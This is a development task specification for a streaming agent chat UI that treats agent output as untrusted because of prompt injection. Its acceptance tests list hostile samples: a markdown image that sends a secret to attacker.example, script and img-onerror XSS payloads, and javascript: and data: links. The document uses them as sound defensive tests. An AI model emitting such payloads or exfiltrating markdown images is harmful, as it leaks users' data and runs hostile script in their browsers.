# U-05. Chat with streaming

- **Lane:** U · **Module:** `apps/engine-ui` · **Milestone:** M2
- **Depends on:** U-02 · **Unblocks:** U-04 (test-chat step), X-04
- **Status:** todo
- **Spec:** Security hardening (5 agent output is untrusted, 6 tool calls never become code), Build plan (spike: SSE through the passthrough); ADRs: [0003](../../adr/0003-ui-as-signed-bundle.md)

## Goal

The owner can chat with any agent: replies stream in, can be stopped, render as safe markdown with highlighted code, and agent output can never cause a network request, run script or become an executable control.

## Context

Agent output is attacker-controlled the moment an agent reads a web page or a document (prompt injection). The spec's test for this task: an agent reply containing `![x](https://attacker.example/?d=secret)` causes no network request. CSP and Trusted Types are the backstop; the renderer must not rely on them. The predecessor chat (`promptbook`, `src/book-components/Chat`) may be ported (license gate lifted); port, then adapt it to the rules below. Anything it does with `innerHTML`, KaTeX from a CDN, iframes for citations or embeds, or rendering of raw HTML must go.

## Scope

- Routes: `/agents/$agentId/chat` (chat list plus a new-chat composer) and `/agents/$agentId/chat/$chatId`. The list shows every chat of the agent, including other members' and public visitors' chats (read-only for chats the owner did not start), with a source label. Whether the composer is shown is decided by `can('chats.send')` and whether the chat belongs to the current member, never by role name.
- `ChatPanel` component (`src/features/chat/chat-panel.tsx`) reusable by U-04's test step: message list, composer, stop button, connection state.
- Streaming through the client port: `sendMessage(chatId, input, { signal })` returning an async iterable of typed events from C-04 (at least `delta`, `tool-call`, `done`, `error`). Stop aborts the iterable and calls the API's cancel endpoint so the engine stops generating. A dropped stream marks the message "interrupted", refetches the chat from the server and offers "Retry", which re-sends only on click.
- Composer: `Textarea`, Enter sends, Shift+Enter inserts a newline, disabled while a reply streams, `Esc` or the Stop button stops, length limit from the API.
- Message list: auto-scroll while at the bottom; a "Jump to latest" button when the user has scrolled up; one `aria-live="polite"` announcement when a reply finishes (not per token).
- Rendering (`src/features/chat/render/`):
  - User messages: plain text, whitespace preserved.
  - Agent messages while streaming: plain text. After `done`: markdown, per the spec ("sanitised after the stream ends").
  - Markdown: `react-markdown` + `remark-gfm`, `skipHtml`, no `rehype-raw`. Raw HTML in the source shows as literal text. Allowed nodes: paragraphs, headings (rendered one level lower), emphasis, strong, strikethrough, lists, task lists (checkboxes disabled), blockquotes, tables, thematic breaks, inline code, code blocks, links.
  - Links: only absolute `http:`/`https:` URLs to another origin become `ExternalLink` with the full URL visible on hover and focus. `javascript:`, `data:`, `vbscript:`, `blob:`, `file:`, relative and same-origin URLs render as plain text. One function, `src/security/safe-url.ts`, decides.
  - Images: never an `<img>`. Rendered as text "Image: <alt> (<host>)", linked under the same URL rule.
  - Code blocks: highlighted with `@lezer/highlight` `highlightCode` and lazily loaded `@codemirror/lang-*` parsers (JavaScript/TypeScript, JSON, Python, shell, CSS, HTML, SQL, YAML, Markdown), emitted as React `<span>`s with `classHighlighter` classes. Unknown languages render unhighlighted. A `CopyButton` copies the text; nothing offers to run code.
  - Tool calls: a collapsed, non-interactive card with the tool name, status and arguments as escaped JSON text.

## Out of scope

- Attachments, voice, screencast. Math rendering (would need KaTeX CSS and fonts bundled locally; later).
- Editing or deleting messages. Agent book editing (U-04).

## Design notes

- No `dangerouslySetInnerHTML` and no HTML parsing anywhere in the pipeline, so the `ptbk-html` Trusted Types policy is not needed here. If a future need appears, create `src/security/trusted-html.ts` with DOMPurify (`RETURN_TRUSTED_TYPE`) as the only place allowed to produce HTML, and add a test for it.
- Streaming state lives in a reducer (`idle | streaming | stopping | done | interrupted | error`), not in the query cache; the final message is written to the cache on `done`.
- Tests drive the stream with a controllable async generator (resolve each event by hand), no timers or sleeps.

## Acceptance criteria

- [ ] Streaming test: deltas appear in order; markdown renders only after `done`; the live region announces once.
- [ ] Stop test: aborts the iterable, calls cancel once, keeps the partial text and marks it stopped; a second click does nothing.
- [ ] Dropped stream and `error` event each show their state; Retry re-sends only on click.
- [ ] Hostile output tests (each asserts the DOM and that no `img`, `script`, `iframe` or `a[href]` with a forbidden scheme exists):
  - [ ] `![x](https://attacker.example/?d=secret)` renders no `<img>` and starts no request (spy on `fetch` and image loads);
  - [ ] `<script>alert(1)</script>` and `<img src=x onerror=alert(1)>` render as literal text;
  - [ ] `[click](javascript:alert(1))`, `[x](data:text/html,…)`, `[x](/v1/agents/1)` render as text without `href`;
  - [ ] `[docs](https://example.com/a)` renders an external link with `rel="noopener noreferrer"`;
  - [ ] a tool call with HTML in its arguments shows it as text.
- [ ] Code block test: a TypeScript block yields highlight spans; an unknown language renders as plain text; copy puts the exact text on the clipboard.
- [ ] `test:csp` sends a message against the in-memory client's scripted reply containing the hostile samples and records zero violations and zero non-`'self'` requests.
- [ ] Keyboard: send, newline, stop and jump-to-latest work without a mouse; `axe-core` passes.
- [ ] `bun run check` passes.
- [ ] **Status** line above set to `done (#<PR>)`.

## Risks and open points

- Rendering plain text until `done` follows the spec literally but reflows the message at the end. Rendering markdown incrementally is equally safe here because no HTML is ever parsed; changing it needs a short ADR, not a silent deviation.
- C-04 must define the stream event union, cancel, and chat listing across all sources; amend the contract first if missing.
- Whether the client uses `EventSource` or `fetch` with a stream reader is a C-04 detail; the UI only sees the async iterable.
